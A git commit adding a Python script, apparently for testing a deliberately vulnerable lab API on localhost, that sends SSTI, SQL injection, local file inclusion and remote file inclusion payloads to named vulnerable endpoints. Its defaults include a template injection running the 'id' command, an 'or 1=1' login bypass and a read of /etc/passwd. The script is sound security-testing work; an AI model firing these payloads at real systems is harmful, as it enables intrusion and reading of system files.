0d86af0687da1a64dedd5d8fb2195cd294bcd75c
dennysvande <vandesimbolon@gmail.com>
2025-03-20 08:27:14 -0700

    Update the script.

---
+++ vuln-api-scanner.py
@@ -0,0 +1,140 @@
+import requests
+import argparse
+import textwrap
+import json
+
+parser = argparse.ArgumentParser(
+    description='Vulnerable API Scanner',
+    formatter_class=argparse.RawDescriptionHelpFormatter,
+    epilog=textwrap.dedent('''Example:
+        vuln-api-scanner.py -u http://127.0.0.1 -e sqli -p payload.txt # specified vuln and payload file
+        vuln-api-scanner.py -u http://127.0.0.1 -e sqli # specified vuln with default payload
+        vuln-api-scanner.py -u http://127.0.0.1 # test all vulns
+'''))
+
+parser.add_argument('-u', '--url', action='store', dest='url', default='http://127.0.0.1:4444', help='specified URL')
+parser.add_argument('-e', '--exploit', action='store', dest='exploit', default='all', help='specified Vulnerability')
+parser.add_argument('-p', '--payload', action='store', dest='payload', default='default' ,help='specified payloads')
+
+class Scanner:
+    def __init__(self, args):
+        
+        self.args = args
+        self.url = self.args.url
+
+        if self.args.payload == "default":
+            self.ssti_payload = "{{namespace.__init__.__globals__.os.popen('id').read()}}"
+            self.sqli_payload = "'or 1=1--"
+            self.lfi_payload = "/etc/passwd"
+            self.rfi_payload = "http://127.0.0.1:4444/github-token"
+        else:
+            if len(open(self.args.payload).read()) <= 1:
+                raise Exception("Payload file must not be empty")
+            else:
+                self.ssti_payload = open(self.args.payload)
+                self.sqli_payload = open(self.args.payload)
+                self.lfi_payload = open(self.args.payload)
+                self.rfi_payload = open(self.args.payload)
+        
+class Injection(Scanner):
+    def ssti(self):
+        try:
+            if self.args.payload == "default":
+                request_body = {"mathexp": self.ssti_payload}
+                response = requests.post(self.url + "/api/sstivuln", json=request_body, timeout=10)
+                if response.status_code == 200:
+                    print(response.text)
+                    print("Vulnerable to SSTI!\n")
+                else:
+                    print("Not vulnerable")
+            else:
+                for payload in self.ssti_payload.read().splitlines():
+                    request_body = {"mathexp": payload}
+                    response = requests.post(self.url + "/api/sstivuln", json=request_body, timeout=10)
+                    if response.status_code == 200:
+                        print(response.text)
+                        print("Vulnerable to SSTI!\n")
+                    else:
+                        print("Not vulnerable")
+        except Exception as e:
+            print("Encounter an error:", e)
+    
+    def xss(self):
+        pass
+
+    def sqli(self):
+        try:
+            request_body = {"username": self.sqli_payload, "password": "fakepass"}
+            print(request_body)
+            response = requests.post(self.url + "/api/sqlivuln", json=request_body, timeout=10)
+            if response.status_code == 200:
+                print(response.text)
+                print("Vulnerable to SQLi!\n")
+            else:
+                print("Not vulnerable")
+        except Exception as e:
+            print("Encounter an error:", e)
+
+    def hhi(self):
+        pass
+
+class BrokenAccessControl(Scanner):
+    def lfi(self):
+        try:
+            if self.args.payload == "default":
+                request_body = {"filename": self.lfi_payload}
+                response = requests.post(self.url + "/api/lfivuln", json=request_body, timeout=10)
+                if response.status_code == 200:
+                    print(response.text)
+                    print("Vulnerable to SSTI!\n")
+                else:
+                    print("Not vulnerable")
+            else:
+                for payload in self.lfi_payload.read().splitlines():
+                    request_body = {"filename": payload}
+                    response = requests.post(self.url + "/api/lfivuln", json=request_body, timeout=10)
+                    if response.status_code == 200:
+                        print(response.text)
+                        print("Vulnerable to LFI!\n")
+                    else:
+                        print("Not vulnerable")
+        except Exception as e:
+            print("Encounter an error:", e)
+
+    def rfi(self):
+        try:
+            request_body = {"imagelink": self.rfi_payload}
+            response = requests.post(self.url + "/api/rfivuln", json=request_body, timeout=10)
+            if response.status_code == 200:
+                print(response.text)
+                print("Vulnerable to RFI!\n")
+            else:
+                print("Not vulnerable")
+        except Exception as e:
+            print("Encounter an error:", e)
+
+if __name__ == "__main__":
+    args = parser.parse_args()
+
+    injection_client = Injection(args)
+    broken_access_client = BrokenAccessControl(args)
+
+    if args.exploit == "ssti":
+        injection_client.ssti()
+    elif args.exploit == "xss":
+        injection_client.xss()
+    elif args.exploit == "sqli":
+        injection_client.sqli()
+    elif args.exploit == "hhi":
+        injection_client.hhi()
+    elif args.exploit == "lfi":
+        broken_access_client.lfi()
+    elif args.exploit == "rfi":
+        broken_access_client.rfi()
+    else:
+        injection_client.ssti()
+        injection_client.xss()
+        injection_client.sqli()
+        injection_client.hhi()
+        broken_access_client.lfi()
+        broken_access_client.rfi()
